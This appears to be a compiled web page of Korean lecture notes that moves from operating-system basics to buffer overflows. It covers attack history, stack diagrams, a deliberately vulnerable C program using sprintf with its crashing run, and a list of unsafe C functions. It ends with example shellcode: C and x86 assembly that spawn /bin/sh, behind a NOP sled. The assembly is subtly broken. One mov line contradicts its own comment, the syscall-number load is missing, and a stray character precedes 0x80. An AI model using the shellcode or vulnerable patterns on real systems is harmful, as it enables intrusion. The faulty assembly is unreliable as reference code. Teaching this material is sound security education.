import{_ as s,c as a,a as e,o as l}from"./app-PD8EXbnJ.js";const t="/assets/image-26-CNPiH62j.png",i="/assets/image-7-C0SBc78x.png",o="/assets/image-9-CoX_5ylA.png",c={};function p(r,n){return l(),a("div",null,[...n[0]||(n[0]=[e('<h1 id="_09-buffer-overflow" tabindex="-1"><a class="header-anchor" href="#_09-buffer-overflow"><span>09. Buffer Overflow</span></a></h1><h1 id="os-overview" tabindex="-1"><a class="header-anchor" href="#os-overview"><span>OS Overview</span></a></h1><h2 id="operating-system" tabindex="-1"><a class="header-anchor" href="#operating-system"><span>Operating System</span></a></h2><ul><li><strong>Multiprogramming</strong>은 효율성을 위해 필요함. <ul><li>단일 사용자는 CPU와 I/O 장치를 항상 바쁘게 유지할 수 없음.</li><li>Multiprogramming은 CPU가 항상 실행할 작업을 갖도록 작업(코드 및 데이터)을 구성</li><li>시스템의 전체 작업 중 일부(subset)는 메모리에 유지됨.</li><li>하나의 작업이 선택되어 job scheduling을 통해 실행됨.</li><li>작업이 대기해야 할 때(예: I/O 대기), OS는 다른 작업으로 전환함.</li></ul></li><li>Timesharing(multitasking)은 사용자가 실행 중인 각 작업과 상호 작용할 수 있도록 CPU가 작업을 매우 자주 전환하는 논리적 확장임. <ul><li>대화형(interactive) 컴퓨팅을 생성함.</li><li>응답 시간은 충분히 짧아야 함.</li><li>각 사용자는 메모리에서 실행 중인 최소 하나의 프로그램을 가짐 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>→</mo></mrow><annotation encoding="application/x-tex">\\rightarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.3669em;"></span><span class="mrel">→</span></span></span></span> process</li><li>여러 작업이 동시에 실행 준비가 된 경우 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>→</mo></mrow><annotation encoding="application/x-tex">\\rightarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.3669em;"></span><span class="mrel">→</span></span></span></span> CPU scheduling</li><li>Process들이 메모리에 맞지 않는 경우, swapping을 통해 실행을 위해 넣고 뺌</li><li>메모리에 완전히 적재되지 않은 process의 실행을 허용하는 virtual memory</li></ul></li></ul><h2 id="operating-system-operations" tabindex="-1"><a class="header-anchor" href="#operating-system-operations"><span>Operating System Operations</span></a></h2><ul><li><strong>Dual-mode operation</strong>은 OS가 자신과 다른 시스템 구성 요소를 보호할 수 있게 함. <ul><li>User mode와 kernel mode</li><li>하드웨어에 의해 제공되는 mode bit <ul><li>시스템이 user code를 실행 중인지 kernel code를 실행 중인지 구별하는 기능을 제공함.</li><li>일부 명령어는 특권(privileged) 명령어로 지정되어 kernel mode에서만 실행 가능함.</li><li>System call은 모드를 kernel로 변경하고, 호출에서 반환될 때 user로 재설정함.</li></ul></li></ul></li></ul><h2 id="process-management" tabindex="-1"><a class="header-anchor" href="#process-management"><span>Process Management</span></a></h2><ul><li><strong>Process</strong><ul><li>실행 중인 프로그램</li><li>시스템 내 작업의 단위</li><li>프로그램은 수동적(passive) 개체이며, process는 능동적(active) 개체임.</li></ul></li><li>Process는 작업을 수행하기 위해 리소스가 필요함. <ul><li>CPU, 메모리, I/O, file</li><li>초기화 데이터</li></ul></li><li>Process 종료 시 재사용 가능한 리소스의 회수가 필요함.</li><li>Single-threaded process는 실행할 다음 명령어의 위치를 지정하는 하나의 program counter를 가짐.</li><li>Multi-threaded process는 thread당 하나의 program counter를 가짐.</li></ul><h2 id="memory-management" tabindex="-1"><a class="header-anchor" href="#memory-management"><span>Memory Management</span></a></h2><ul><li>처리 전후의 모든 데이터는 메모리에 있음.</li><li>실행하기 위한 모든 명령어는 메모리에 있음.</li><li>Memory management는 언제 무엇을 메모리에 둘지 결정함. <ul><li>CPU utilization과 사용자에 대한 응답 시간을 최적화함.</li></ul></li><li>Memory management 활동 <ul><li>현재 메모리의 어느 부분이 사용되고 있으며 누구에 의해 사용되는지 추적함.</li><li>어떤 process(또는 그 일부)와 데이터를 메모리로 이동시키고 내보낼지 결정함.</li><li>필요에 따라 메모리 공간을 할당(allocating)하고 해제(deallocating)함.</li></ul></li></ul><h2 id="storage-management" tabindex="-1"><a class="header-anchor" href="#storage-management"><span>Storage Management</span></a></h2><ul><li>OS는 정보 저장소에 대한 균일하고 논리적인 뷰(view)를 제공함. <ul><li>물리적 속성을 논리적 저장 단위인 file로 추상화함.</li><li>각 매체는 장치(예: disk drive, tape drive)에 의해 제어됨.</li><li>가변적인 속성에는 접근 속도, 용량, 데이터 전송 속도, 접근 방법(순차 또는 무작위)이 포함됨.</li></ul></li><li>File-System management <ul><li>File들은 일반적으로 directory들로 구성됨.</li><li>누가 무엇에 접근할 수 있는지 결정하기 위해 대부분의 시스템에서 access control을 수행함.</li><li>OS 활동에 포함되는 것들 <ul><li>File 및 directory 생성과 삭제</li><li>File 및 directory를 조작하기 위한 primitives</li><li>File을 보조 저장소(secondary storage)에 매핑</li><li>안정적인(비휘발성) 저장 매체에 file 백업</li></ul></li></ul></li></ul><h2 id="a-view-of-operating-system-services" tabindex="-1"><a class="header-anchor" href="#a-view-of-operating-system-services"><span>A View of Operating System Services</span></a></h2><p><img src="'+t+`" alt=""></p><h2 id="system-calls" tabindex="-1"><a class="header-anchor" href="#system-calls"><span>System Calls</span></a></h2><ul><li>OS가 제공하는 서비스에 대한 프로그래밍 인터페이스</li><li>일반적으로 고수준 언어(C 또는 C++)로 작성됨.</li><li>대부분 직접적인 system call 사용보다는 고수준 Application Program Interface(API)를 통해 프로그램에 의해 접근됨. <ul><li><code>open()</code> : system call</li><li><code>fopen()</code> : API(C 언어 라이브러리)</li></ul></li><li>가장 일반적인 세 가지 API <ul><li>Windows용 Win32 API</li><li>POSIX 기반 시스템(UNIX, Linux, Mac OS X)용 POSIX API</li><li>Java virtual machine(JVM)용 Java API</li></ul></li><li>System call 대신 API를 사용하는 이유? <ul><li>이식성(Portability)</li><li>사용 편의성(Ease of use)</li></ul></li></ul><h2 id="system-call-implementation" tabindex="-1"><a class="header-anchor" href="#system-call-implementation"><span>System Call Implementation</span></a></h2><ul><li>일반적으로 각 system call에는 번호가 연관됨. <ul><li>System-call interface는 이 번호에 따라 색인화된 테이블을 유지함.</li></ul></li><li>System call interface는 OS kernel에서 의도된 system call을 호출하고 system call의 상태와 반환 값을 반환함.</li><li>호출자(caller)는 system call이 어떻게 구현되었는지 알 필요가 없음. <ul><li>API를 준수하고 OS가 결과적으로 무엇을 할지 이해하기만 하면 됨.</li><li>OS 인터페이스의 대부분의 세부 사항은 API에 의해 프로그래머로부터 숨겨짐.</li></ul></li></ul><h2 id="api-–-system-call-–-os-relationship" tabindex="-1"><a class="header-anchor" href="#api-–-system-call-–-os-relationship"><span>API – System Call – OS Relationship</span></a></h2><pre><code>                 │                      │               
              ┌──│   user application   │◄──┐           
              │  └──────────────────────┘   │           
              │                             │           
user          ▼ open()                      │           
mode   ┌────────────────────────────────────┴────┐      
───────┤          system call interface          ├──────
kernel └─┬───────────────────────────────────────┘      
mode     │                                    ▲         
         │  ┌───┐                             │         
         │  │ . │                             │         
         └─►│ . │            open()           │         
            │ . │             Implementation  │         
            ├───┤             of open()       │         
          i ├───┼──────────►  system call     │         
            │ . │              .              │         
            │ . │              .              │         
            │ . │              .              │         
            └───┘             return ─────────┘         
</code></pre><ul><li>System call을 직접 사용함.</li></ul><h2 id="standard-c-library-example" tabindex="-1"><a class="header-anchor" href="#standard-c-library-example"><span>Standard C Library Example</span></a></h2><pre><code>     │#include &lt;stdio.h&gt;      │      
     │int main()              │      
     │{                       │      
     │    .                   │      
     │    .                   │      
    ┌┼──  printf(&quot;Greetings&quot;);◄┐     
    ││    .                   ││     
    ││    .                   ││     
    ││    return 0;           ││     
    ││}                       ││     
    │└────────────────────────┘│     
user│                          │     
mode└───►┌──────────────────┬──┘     
─────────┤standard C library├────────
kernel  ┌┴──────────────────◄─┐      
mode    │                     │      
        │write()              │      
        │ ┌────────────────┐  │      
        └─┼►   write()     ┼──┘      
          │  system call   │         
</code></pre><ul><li><code>write()</code> system call을 호출하는 <code>printf()</code> 라이브러리 호출을 수행하는 C 프로그램</li></ul><h2 id="examples-of-windows-and-unix-system-calls" tabindex="-1"><a class="header-anchor" href="#examples-of-windows-and-unix-system-calls"><span>Examples of Windows and Unix System Calls</span></a></h2><h1 id="buffer-overflow" tabindex="-1"><a class="header-anchor" href="#buffer-overflow"><span>Buffer Overflow</span></a></h1><ul><li>매우 일반적인 공격 메커니즘 <ul><li>1988년 Morris Worm에 의해 처음 널리 사용됨.</li></ul></li><li>예방 기술이 알려져 있음.</li><li>여전히 주요 우려 사항임. <ul><li>널리 배포된 운영 체제 및 애플리케이션에 있는 버그가 많은 코드의 유산</li><li>프로그래머들의 지속적인 부주의한 프로그래밍 관행</li></ul></li></ul><h2 id="brief-history-of-buffer-overflow-attacks" tabindex="-1"><a class="header-anchor" href="#brief-history-of-buffer-overflow-attacks"><span>Brief History of Buffer Overflow Attacks</span></a></h2><table><thead><tr><th>연도</th><th>내용</th></tr></thead><tbody><tr><td><code>1988</code></td><td>Morris Internet Worm은 공격 메커니즘 중 하나로 <code>&quot;fingerd&quot;</code>에서 buffer overflow exploit을 사용함.</td></tr><tr><td><code>1995</code></td><td>Thomas Lopatic에 의해 NCSA httpd 1.3에서 buffer overflow가 발견되어 Bugtraq 메일링 리스트에 게시됨.</td></tr><tr><td><code>1996</code></td><td>Aleph One은 <em>Phrack</em> 매거진에 &quot;Smashing the Stack for Fun and Profit&quot;을 출판하여 stack 기반 buffer overflow 취약점을 악용하는 단계별 지침을 제공함.</td></tr><tr><td><code>2001</code></td><td>Code Red worm은 Microsoft IIS 5.0에서 buffer overflow를 악용함.</td></tr><tr><td><code>2003</code></td><td>Slammer worm은 Microsoft SQL Server 2000에서 buffer overflow를 악용함.</td></tr><tr><td><code>2004</code></td><td>Sasser worm은 Microsoft Windows 2000/XP Local Security Authority Subsystem Service (LSASS)에서 buffer overflow를 악용함.</td></tr></tbody></table><h2 id="buffer-overflow-buffer-overrun" tabindex="-1"><a class="header-anchor" href="#buffer-overflow-buffer-overrun"><span>Buffer Overflow/Buffer Overrun</span></a></h2><ul><li>Buffer overflow 또는 buffer overrun은 NIST의 주요 정보 보안 용어 사전에서 다음과 같이 정의됨 <ul><li>&quot;할당된 용량보다 더 많은 입력이 buffer 또는 데이터 저장 영역에 배치되어, 다른 정보를 덮어쓰는 인터페이스의 상태. 공격자는 이러한 상태를 악용하여 시스템을 충돌시키거나, 시스템의 제어권을 얻을 수 있는 특수하게 제작된 코드를 삽입함.&quot;</li></ul></li></ul><h2 id="buffer-overflow-basics" tabindex="-1"><a class="header-anchor" href="#buffer-overflow-basics"><span>Buffer Overflow Basics</span></a></h2><ul><li>Process가 고정된 크기의 buffer 제한을 넘어 데이터를 저장하려고 시도할 때 발생하는 프로그래밍 오류</li><li>인접한 메모리 위치를 덮어씀 <ul><li>위치에는 다른 프로그램 변수, 파라미터 또는 프로그램 제어 흐름 데이터가 포함될 수 있음.</li><li>Buffer는 process의 stack, heap 또는 데이터 섹션에 위치할 수 있음.</li></ul></li><li>결과 <ul><li>프로그램 데이터의 손상</li><li>예상치 못한 제어 전송</li><li>메모리 접근 위반</li><li>공격자가 선택한 코드의 실행</li></ul></li></ul><h2 id="basic-buffer-overflow-example" tabindex="-1"><a class="header-anchor" href="#basic-buffer-overflow-example"><span>Basic Buffer Overflow Example</span></a></h2><blockquote><p><strong>Figure 10.1</strong> Basic Buffer Overflow Example <img src="`+i+`" alt=""></p></blockquote><h2 id="basic-buffer-overflow-stack-values" tabindex="-1"><a class="header-anchor" href="#basic-buffer-overflow-stack-values"><span>Basic Buffer Overflow Stack Values</span></a></h2><pre><code> Memory        Before             After          Contains  
 Address     gets(str2)         gets(str2)       Value of  
         │                │ │                │             
 . . . . │   . . . . . .  │ │ . . . . . .    │             
         ├────────────────┤ ├────────────────┤             
bffffbf4 │    34fcffbf    │ │    34fcffbf    │         argv
         │    4 . . .     │ │    3 . . .     │             
         ├────────────────┤ ├────────────────┤             
bffffbf0 │    01000000    │ │    01000000    │         argc
         │    . . . .     │ │    . . . .     │             
         ├────────────────┤ ├────────────────┤             
bffffbec │    c6bd0340    │ │    c6bd0340    │  return addr
         │    . . . @     │ │    . . . @     │             
         ├────────────────┤ ├────────────────┤             
bffffbe8 │    08fcffbf    │ │    08fcffbf    │ old base ptr
         │    . . . .     │ │    . . . .     │             
         ├────────────────┤ ├────────────────┤             
bffffbe4 │    00000000    │ │    01000000    │        valid
         │    . . . .     │ │    . . . .     │             
         ├────────────────┤ ├────────────────┤             
bffffbe0 │    80640140    │ │    00640140    │             
         │    . d . @     │ │    . d . @     │             
         ├────────────────┤ ├────────────────┤             
bffffbdc │    54001540    │ │    4e505554    │    str1[4-7]
         │    T . . @     │ │    N P U T     │             
         ├────────────────┤ ├────────────────┤             
bffffbd8 │    53544152    │ │    42414449    │    str1[0-3]
         │    S T A R     │ │    B A D I     │             
         ├────────────────┤ ├────────────────┤             
bffffbd4 │    00850408    │ │    4e505554    │    str2[4-7]
         │    . . . .     │ │    N P U T     │             
         ├────────────────┤ ├────────────────┤             
bffffbd0 │    30561540    │ │    42414449    │    str2[0-3]
         │    0 V . @     │ │    B A D I     │             
         ├────────────────┤ ├────────────────┤             
 . . . . │   . . . . . .  │ │ . . . . . .    │             
         │                │ │                │             
</code></pre><blockquote><p><strong>Figure 10.2</strong> Basic Buffer Overflow Stack Values</p></blockquote><h2 id="buffer-overflow-attacks" tabindex="-1"><a class="header-anchor" href="#buffer-overflow-attacks"><span>Buffer Overflow Attacks</span></a></h2><ul><li>Buffer overflow를 악용하기 위해 공격자가 필요한 것 <ul><li>공격자의 제어 하에 외부에서 공급된 데이터를 사용하여 트리거할 수 있는 프로그램 내의 buffer overflow 취약점을 식별하는 것</li><li>해당 buffer가 메모리에 어떻게 저장되는지 이해하고 손상 가능성을 결정하는 것</li></ul></li><li>취약한 프로그램 식별 방법 <ul><li>프로그램 소스 검사(inspection)</li><li>프로그램이 크기가 초과된 입력을 처리할 때 프로그램 실행을 추적(tracing)</li><li>잠재적으로 취약한 프로그램을 자동으로 식별하기 위해 fuzzing과 같은 도구 사용</li></ul></li></ul><h2 id="programming-language-history" tabindex="-1"><a class="header-anchor" href="#programming-language-history"><span>Programming Language History</span></a></h2><p><img src="`+o+`" alt=""></p><ul><li>기계 수준에서 컴퓨터 프로세서에 의해 실행되는 기계 명령어에 의해 조작되는 데이터는 프로세서의 register나 메모리에 저장됨.</li><li>어셈블리 언어 프로그래머는 저장된 모든 데이터 값의 올바른 해석에 대한 책임이 있음.</li><li>현대의 고수준 언어 <ul><li>타입(type)과 유효한 연산에 대한 강력한 개념을 가짐.</li><li>Buffer overflow에 취약하지 않음.</li><li>오버헤드가 발생하며 사용에 일부 제한이 있음.</li></ul></li><li>C 및 관련 언어 <ul><li>고수준 제어 구조를 갖지만 메모리에 대한 직접 접근을 허용함.</li><li>따라서 buffer overflow에 취약함.</li><li>널리 사용되고, 안전하지 않으며, 따라서 취약한 코드의 거대한 유산을 가짐.</li></ul></li></ul><h2 id="stack-buffer-overflows" tabindex="-1"><a class="header-anchor" href="#stack-buffer-overflows"><span>Stack Buffer Overflows</span></a></h2><ul><li>Buffer가 stack에 위치할 때 발생함. <ul><li>Stack smashing이라고도 함.</li><li>Morris Worm에 의해 사용됨.</li><li>악용(exploits)에는 확인되지 않은 buffer overflow가 포함됨.</li></ul></li><li>여전히 널리 악용되고 있음.</li><li>Stack frame <ul><li>한 함수가 다른 함수를 호출할 때 반환 주소(return address)를 저장할 곳이 필요함.</li><li>또한 호출된 함수로 전달될 파라미터를 저장하고 레지스터 값을 저장할 위치가 필요할 수 있음.</li></ul></li></ul><h2 id="stack-frame-with-functions-p-and-q" tabindex="-1"><a class="header-anchor" href="#stack-frame-with-functions-p-and-q"><span>Stack Frame with Functions P and Q</span></a></h2><pre><code>  ┌──────────────────┐           
P:│    Return Addr   │           
  ├──────────────────┤           
  │ Old Frame Pointer│◄──┐       
  ├──────────────────┤   │       
  │      param 2     │   │       
  ├──────────────────┤   │       
  │      param 1     │   │Frame  
  ├──────────────────┤   │Pointer
Q:│ Return Addr in P │   │       
  ├──────────────────┤   │       
  │ Old Frame Pointer│◄──┘       
  ├──────────────────┤           
  │      local 1     │           
  ├──────────────────┤           
  │      local 2     │◄───Stack  
  ├─────────┬────────┤    Pointer       
  │         ▼        │           
</code></pre><blockquote><p><strong>Figure 10.3</strong> Example Stack Frame with Functions P and Q</p></blockquote><h2 id="programs-and-processes" tabindex="-1"><a class="header-anchor" href="#programs-and-processes"><span>Programs and Processes</span></a></h2><pre><code>                          Process image in                       
                             main memory                         
                      ┌────────────────────────┐◄───────┐        
                      │ Kernel Code and Data   │ Top of Memory   
                      ├────────────────────────┤                 
                      │         Stack          │                 
                      │           │            │                 
                      │           ▼            │                 
                      ├────────────────────────┤                 
                      │     Spare Memory       │                 
                      ├────────────────────────┤                 
                      │           ▲            │                 
                      │           │            │                 
   Program File       │         Heap           │                 
┌───────────────┐---─►├────────────────────────┤                 
│  Global Data  │     │       Global Data      │                 
├───────────────┤---─►├────────────────────────┤                 
│    Program    │     │       Program          │                 
│ Machine Code  │     │       Machine Code     │                 
└───────────────┘---─►├────────────────────────┤                 
                      │  Process Control Block │ Bottom of Memory
                      └────────────────────────┘◄───────┘        
</code></pre><blockquote><p><strong>Figure 10.4</strong> Program Loading into Process Memory</p></blockquote><pre><code>Memory        Before           After      Contains    
Address      gets(inp)       gets(inp)    Value of    
                                                      
  . . .  │   . . . .    ││   . . . .    │             
         │              ││              │             
         ├──────────────┤├──────────────┤             
bffffbe0 │   3e850408   ││   00850408   │    tag      
         │   &gt; . . .    ││   . . . .    │             
         ├──────────────┤├──────────────┤             
bffffbdc │   f0830408   ││   94830408   │ return addr 
         │   . . . .    ││   . . . .    │             
         ├──────────────┤├──────────────┤             
bffffbd8 │   e8fbffbf   ││   e8ffffbf   │ old base ptr
         │   . . . .    ││   . . . .    │             
         ├──────────────┤├──────────────┤             
bffffbd4 │   60840408   ││   65666768   │             
         │   \` . . .    ││   e f g h    │             
         ├──────────────┤├──────────────┤             
bffffbd0 │   30561540   ││   61626364   │             
         │   0 V . @    ││   a b c d    │             
         ├──────────────┤├──────────────┤             
bffffbcc │   1b840408   ││   55565758   │ inp[12-15]  
         │              ││   U V W X    │             
         ├──────────────┤├──────────────┤             
bffffbc8 │   e8fbffbf   ││   51525354   │ inp[8-11]   
         │              ││   Q R S T    │             
         ├──────────────┤├──────────────┤             
bffffbc4 │   3cfcffbf   ││   45464748   │ inp[4-7]    
         │   &lt; . . .    ││   E F G H    │             
         ├──────────────┤├──────────────┤             
bffffbc0 │   34fcffbf   ││   41424344   │ inp[0-3]    
         │   4 . . .    ││   A B C D    │             
         ├──────────────┤├──────────────┤             
         │              ││              │             
  . . .  │   . . . .    ││   . . . .    │             
</code></pre><blockquote><p><strong>Figure 10.6</strong> Basic Stack Overflow Stack Values</p></blockquote><h2 id="stack-overflow-example" tabindex="-1"><a class="header-anchor" href="#stack-overflow-example"><span>Stack Overflow Example</span></a></h2><h3 id="a-another-stack-overflow-c-code" tabindex="-1"><a class="header-anchor" href="#a-another-stack-overflow-c-code"><span>(a) Another stack overflow C code</span></a></h3><div class="language-c line-numbers-mode" data-highlighter="prismjs" data-ext="c"><pre><code class="language-c"><span class="line"><span class="token keyword">void</span> <span class="token function">getinp</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>inp<span class="token punctuation">,</span> <span class="token keyword">int</span> siz<span class="token punctuation">)</span></span>
<span class="line"><span class="token punctuation">{</span></span>
<span class="line">    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot;Input value&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token function">fgets</span><span class="token punctuation">(</span>inp<span class="token punctuation">,</span> siz<span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;buffer3 getinp read %s\\n&quot;</span><span class="token punctuation">,</span> inp<span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"><span class="token punctuation">}</span></span>
<span class="line"></span>
<span class="line"><span class="token keyword">void</span> <span class="token function">display</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>val<span class="token punctuation">)</span></span>
<span class="line"><span class="token punctuation">{</span></span>
<span class="line">    <span class="token keyword">char</span> tmp<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token function">sprintf</span><span class="token punctuation">(</span>tmp<span class="token punctuation">,</span> <span class="token string">&quot;read val: %s\\n&quot;</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token function">puts</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"><span class="token punctuation">}</span></span>
<span class="line"></span>
<span class="line"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span></span>
<span class="line"><span class="token punctuation">{</span></span>
<span class="line">    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token function">getinp</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token function">display</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;buffer3 done\\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"><span class="token punctuation">}</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="b-another-stack-overflow-example-runs" tabindex="-1"><a class="header-anchor" href="#b-another-stack-overflow-example-runs"><span>(b) Another stack overflow example runs</span></a></h3><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh"><pre><code class="language-bash"><span class="line">$ cc <span class="token parameter variable">-o</span> buffer3 buffer3.c</span>
<span class="line">$ ./buffer3</span>
<span class="line">Input value</span>
<span class="line">SAFE</span>
<span class="line">buffer3 getinp <span class="token builtin class-name">read</span> SAFE</span>
<span class="line"><span class="token builtin class-name">read</span> val: SAFE</span>
<span class="line">buffer3 <span class="token keyword">done</span></span>
<span class="line"></span>
<span class="line">$ ./buffer3</span>
<span class="line">Input value</span>
<span class="line">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span>
<span class="line">buffer3 getinp <span class="token builtin class-name">read</span> XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span>
<span class="line"><span class="token builtin class-name">read</span> val: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span>
<span class="line">buffer3 <span class="token keyword">done</span></span>
<span class="line">Segmentation fault <span class="token punctuation">(</span>core dumped<span class="token punctuation">)</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><blockquote><p><strong>Figure 10.7</strong> Another Stack Overflow Example</p></blockquote><h2 id="common-unsafe-c-standard-library-routines" tabindex="-1"><a class="header-anchor" href="#common-unsafe-c-standard-library-routines"><span>Common Unsafe C Standard Library Routines</span></a></h2><table><thead><tr><th>Function</th><th>Description</th></tr></thead><tbody><tr><td><code>gets(char *str)</code></td><td>Read line from standard input into str</td></tr><tr><td><code>sprintf(char *str, char *format, ...)</code></td><td>Create str according to supplied format and variables</td></tr><tr><td><code>strcat(char *dest, char *src)</code></td><td>Append contents of string src to string dest</td></tr><tr><td><code>strcpy(char *dest, char *src)</code></td><td>Copy contents of string src to string dest</td></tr><tr><td><code>vsprintf(char *str, char *fmt, va_list ap)</code></td><td>Create str according to supplied format and variables</td></tr></tbody></table><blockquote><p><strong>Table 10.2</strong> Some Common Unsafe C Standard Library Routines</p></blockquote><h2 id="shellcode" tabindex="-1"><a class="header-anchor" href="#shellcode"><span>Shellcode</span></a></h2><ul><li>공격자가 제공한 코드 <ul><li>종종 overflow되는 buffer에 저장됨.</li><li>전통적으로 사용자 명령줄 인터프리터(shell)로 제어를 전송했음.</li></ul></li><li>기계어 코드(Machine code) <ul><li>프로세서 및 운영 체제에 고유함.</li><li>전통적으로 생성하기 위해 좋은 어셈블리 언어 기술이 필요했음.</li><li>최근에는 이 과정을 자동화하는 다수의 사이트와 도구가 개발됨.</li></ul></li><li>Metasploit Project <ul><li>침투(penetration), IDS 시그니처 개발 및 exploit 연구를 수행하는 사람들에게 유용한 정보를 제공함.</li></ul></li></ul><h2 id="example-shellcode" tabindex="-1"><a class="header-anchor" href="#example-shellcode"><span>Example Shellcode</span></a></h2><h3 id="a-desired-shellcode-code-in-c" tabindex="-1"><a class="header-anchor" href="#a-desired-shellcode-code-in-c"><span>(a) Desired shellcode code in C</span></a></h3><div class="language-c line-numbers-mode" data-highlighter="prismjs" data-ext="c"><pre><code class="language-c"><span class="line"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span></span>
<span class="line"><span class="token punctuation">{</span></span>
<span class="line">    <span class="token keyword">char</span> <span class="token operator">*</span>sh<span class="token punctuation">;</span></span>
<span class="line">    <span class="token keyword">char</span> <span class="token operator">*</span>args<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span></span>
<span class="line"></span>
<span class="line">    sh <span class="token operator">=</span> <span class="token string">&quot;/bin/sh&quot;</span><span class="token punctuation">;</span></span>
<span class="line">    args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> sh<span class="token punctuation">;</span></span>
<span class="line">    args<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token function">execve</span><span class="token punctuation">(</span>sh<span class="token punctuation">,</span> args<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"><span class="token punctuation">}</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="b-equivalent-position-independent-x86-assembly-code" tabindex="-1"><a class="header-anchor" href="#b-equivalent-position-independent-x86-assembly-code"><span>(b) Equivalent position-independent x86 assembly code</span></a></h3><div class="language-as line-numbers-mode" data-highlighter="prismjs" data-ext="as"><pre><code class="language-as"><span class="line">nop                 // end of nop sled</span>
<span class="line">nop</span>
<span class="line">jmp     find        // jump to end of code</span>
<span class="line">cont:</span>
<span class="line">    pop     %esi            // pop address of sh off stack into esi</span>
<span class="line">    xor     %eax,%eax       // zero contents of EAX</span>
<span class="line">    mov     %al,0x7(%esi)   // copy zero byte to end of string sh (%esi)</span>
<span class="line">    mov     %esi,0x8(%esi)  // save address of sh in args[0] (%esi+8)</span>
<span class="line">    mov     %eax,0xc(%esi)  // copy zero to args[1] (which will be NULL)</span>
<span class="line">    mov     %al,%ebx        // copy address of sh (esi) to ebx</span>
<span class="line">    lea     0x8(%esi),%ecx  // copy address of args (esi+8) to ecx</span>
<span class="line">    lea     0xc(%esi),%edx  // copy address of args[1] (esi+c) to edx</span>
<span class="line">    int     \`0x80            // software interrupt to execute syscall</span>
<span class="line">find:</span>
<span class="line">    call    cont            // call cont which saves next address on stack</span>
<span class="line">sh:</span>
<span class="line">    .string &quot;/bin/sh &quot;</span>
<span class="line">args:</span>
<span class="line">    .long   0               // space used for args array</span>
<span class="line">    .long   0               // args[1] and also NULL for env array</span>
